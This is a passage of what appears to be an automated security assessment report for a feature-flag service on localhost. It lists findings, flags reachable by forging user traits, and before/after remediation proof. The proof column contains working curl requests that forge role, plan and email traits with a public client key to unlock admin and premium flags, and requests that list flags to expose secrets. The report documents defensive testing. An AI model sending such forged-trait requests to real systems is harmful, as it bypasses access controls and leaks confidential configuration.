| Production | ✗ Allowed | ✗ Visible | 0 | 12 |

## Reachability map

| Flag | Reachable value | Via | Engine-verified | Live-verified |
|---|---|---|---|---|
| premium_export | enabled | forged traits plan=gold, segment gold_plan | ✓ Yes | ✓ Yes |
| admin_panel | enabled | forged traits role=admin, segment admins | ✓ Yes | ✓ Yes |
| staff_preview | enabled | forged traits email=a@acmeshop.dev, segment staff | ✓ Yes | ✓ Yes |
| early_access_ai | enabled | identifier gc-probe-map-5, segment canary_10 | ✓ Yes | ✓ Yes |
| internal_tools | enabled | identifier gc-probe-a@acmeshop.dev, segment staff_by_identifier | ✓ Yes | ✓ Yes |
| pricing_page | enabled, value price_low | identifier gc-probe-map-0 | ✓ Yes | ✓ Yes |

## Before and after

| Finding | Before | After | Proof |
|---|---|---|---|
| Traits of qa***@acmeshop.dev are readable by anyone with the public client key (`GC-1305BD20`) | ✗ EXPLOITABLE | ✓ BLOCKED | Test identity returned 0 traits; values [MASKED] |
| Forging email=a@acmeshop.dev unlocks staff_preview (segment "staff") (`GC-1A45D85C`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-verify-0","traits":[{"trait_key":"email","trait_value":"a@acmeshop.dev","transient":true}],"transient":true}' → staff_preview is off (exploited state on) |
| Identity override on beta_dashboard is readable by anyone who knows the identifier (`GC-58B8A822`) | ✗ EXPLOITABLE | ✓ BLOCKED | Test identity override checked; values [MASKED] |
| Forging plan=gold unlocks premium_export (segment "gold_plan") (`GC-688647D2`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-verify-0","traits":[{"trait_key":"plan","trait_value":"gold","transient":true}],"transient":true}' → premium_export is off (exploited state on) |
| Forging role=admin unlocks admin_panel (segment "admins") (`GC-70850605`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-a28381e83aee44394d0d370e3dcfb250","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}' → admin_panel is off (exploited state on) |
| Traits of ce***@acmeshop.dev are readable by anyone with the public client key (`GC-914405C1`) | ✗ EXPLOITABLE | ✓ BLOCKED | Test identity returned 0 traits; values [MASKED] |
| Production: "Hide sensitive data" is OFF (`GC-9FE52BC7`) | ✗ EXPLOITABLE | ✓ BLOCKED | hide_sensitive_data=true |
| Production: "Allow client SDKs to set user traits" is ON (`GC-A60CCA1A`) | ✗ EXPLOITABLE | ✓ BLOCKED | allow_client_traits=false |
| Unreleased product leaked through flag: project_nightjar_launch_2026_12_15 (`GC-07590992`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>' → project_nightjar_launch_2026_12_15 visible to client key: false |
| Sensitive flag "project_nightjar_launch_2026_12_15" is not "Server-side only" (`GC-64038665`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>' → project_nightjar_launch_2026_12_15 visible to client key: false |
| Sensitive flag "payment_config" is not "Server-side only" (`GC-0B5C5F67`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>' → payment_config visible to client key: false |
| Secret in a client-visible flag value: payment_config (`GC-8B6A1273`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>' → payment_config visible to client key: false |
| Sensitive flag "internal_api_url" is not "Server-side only" (`GC-03878136`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>' → internal_api_url visible to client key: false |
| Internal URL leaked to every browser: internal_api_url (`GC-63E8DE85`) | ✗ EXPLOITABLE | ✓ BLOCKED | curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>' → internal_api_url visible to client key: false |

## Method and scope

Scope (the only hosts contacted):

- `localhost:3030`
- `localhost:8000`

- Probes sent: 669
- Duration: 151.7 s
  - explain: 66.3 s
  - map: 7.9 s
  - recon: 77.5 s
- Engine parity: 200/200
- Engine: v5.7.0
- Tool: Gatecrasher dev
- Note: skipped out-of-scope script cdn.jsdelivr.net/npm/flagsmith@10.0.0/index.js: host not in allowed_domains
- Note: early_access_ai is behind a live percentage rollout, so real users already receive it: it is not reported as an unreleased product.
